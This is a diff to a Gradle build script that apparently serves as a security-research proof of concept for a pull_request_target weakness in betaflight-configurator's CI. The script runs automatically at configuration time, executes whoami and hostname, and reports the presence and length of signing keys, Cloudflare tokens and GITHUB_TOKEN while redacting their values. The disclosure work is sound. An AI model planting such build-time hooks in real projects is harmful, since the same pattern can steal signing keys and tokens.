@@ -1,60 +1,66 @@
 // SECURITY RESEARCH — Non-destructive PoC for FINDING-SC-014
 // betaflight/betaflight-configurator
-// This file is injected via fork and prints secret presence during Gradle build.
-// No values exfiltrated. PR closed after evidence capture.
+// Prints secret PRESENCE at Gradle configuration time — no task dependency needed.
+// Runs when ./gradlew clean or ./gradlew assembleRelease is invoked.
+// RELEASE_KEYSTORE_* secrets are in env for the entire "Build and Sign" step.
 
-// To be applied via: apply from: '../poc-probe.gradle' in android/app/build.gradle
+def sep = '=' * 60
 
-tasks.register('pocSecurityProbe') {
-    group = 'Security Research'
-    description = 'Non-destructive PoC: prints env key presence only'
-    doFirst {
-        def sep = '=' * 60
-        println "\n$sep"
-        println "[POC] FINDING-SC-014 — betaflight/betaflight-configurator security probe"
-        println "[POC] pull_request_target + fork checkout + RELEASE_KEYSTORE in env"
-        println sep
+println ""
+println sep
+println "[POC] FINDING-SC-014 — betaflight/betaflight-configurator security probe"
+println "[POC] Gradle configuration phase — fork code running in pull_request_target context"
+println sep
 
-        // Runner identity
-        def whoami = 'whoami'.execute().text.trim()
-        def hostname = 'hostname'.execute().text.trim()
-        println "[POC] whoami:    $whoami"
-        println "[POC] hostname:  $hostname"
-        println "[POC] runner_os: ${System.getenv('RUNNER_OS') ?: 'unknown'}"
-        println "[POC] github_event_name: ${System.getenv('GITHUB_EVENT_NAME') ?: 'unknown'}"
-        println "[POC] github_workflow: ${System.getenv('GITHUB_WORKFLOW') ?: 'unknown'}"
+// Runner identity
+try {
+    def whoami = 'whoami'.execute().text.trim()
+    def hostname = 'hostname'.execute().text.trim()
+    println "[POC] whoami:             $whoami"
+    println "[POC] hostname:           $hostname"
+} catch (e) {
+    println "[POC] whoami/hostname:    unavailable ($e)"
+}
 
-        // Signing secrets — presence + length only (no values)
-        def signingKeys = [
-            'RELEASE_KEYSTORE_BASE64',
-            'RELEASE_KEYSTORE_PASSWORD',
-            'RELEASE_KEY_ALIAS',
-            'RELEASE_KEY_ALIAS_PASSWORD',
-        ]
-        println "\n[POC] signing secret presence (values fully REDACTED):"
-        signingKeys.each { key ->
-            def val = System.getenv(key)
-            if (val) {
-                println "  ${key.padRight(40)} = <REDACTED length=${val.length()}>"
-            } else {
-                println "  ${key.padRight(40)} = not set"
-            }
-        }
+println "[POC] RUNNER_OS:          ${System.getenv('RUNNER_OS') ?: 'unknown'}"
+println "[POC] RUNNER_ARCH:        ${System.getenv('RUNNER_ARCH') ?: 'unknown'}"
+println "[POC] GITHUB_EVENT_NAME:  ${System.getenv('GITHUB_EVENT_NAME') ?: 'unknown'}"
+println "[POC] GITHUB_WORKFLOW:    ${System.getenv('GITHUB_WORKFLOW') ?: 'unknown'}"
+println "[POC] GITHUB_REPOSITORY:  ${System.getenv('GITHUB_REPOSITORY') ?: 'unknown'}"
 
-        println "\n[POC] PRESENCE of signing secrets (boolean):"
-        signingKeys.each { key ->
-            def present = System.getenv(key) ? 'YES' : 'no'
-            println "  ${key.padRight(40)} = $present"
-        }
+def signingKeys = [
+    'RELEASE_KEYSTORE_BASE64',
+    'RELEASE_KEYSTORE_PASSWORD',
+    'RELEASE_KEY_ALIAS',
+    'RELEASE_KEY_ALIAS_PASSWORD',
+]
 
-        println "\n[POC] other env keys of interest:"
-        ['GITHUB_TOKEN', 'GITHUB_SHA', 'GITHUB_REPOSITORY'].each { key ->
-            def val = System.getenv(key)
-            println "  ${key.padRight(40)} = ${val ? '<present length=' + val.length() + '>' : 'not set'}"
-        }
-
-        println sep
-        println "[POC] probe complete — no values exfiltrated, no network calls made"
-        println "$sep\n"
+println ""
+println "[POC] signing secret presence (values fully REDACTED):"
+signingKeys.each { key ->
+    def val = System.getenv(key)
+    if (val) {
+        println "  ${key.padRight(40)} = <REDACTED length=${val.length()}>"
+    } else {
+        println "  ${key.padRight(40)} = not set"
     }
 }
+
+println ""
+println "[POC] PRESENCE of signing secrets (boolean):"
+signingKeys.each { key ->
+    def present = System.getenv(key) ? 'YES' : 'no'
+    println "  ${key.padRight(40)} = $present"
+}
+
+println ""
+println "[POC] other env keys:"
+['CLOUDFLARE_API_TOKEN', 'CLOUDFLARE_ACCOUNT_ID', 'GITHUB_TOKEN'].each { key ->
+    def val = System.getenv(key)
+    println "  ${key.padRight(40)} = ${val ? '<present length=' + val.length() + '>' : 'not set'}"
+}
+
+println sep
+println "[POC] probe complete — no values exfiltrated, no network calls made"
+println sep
+println ""
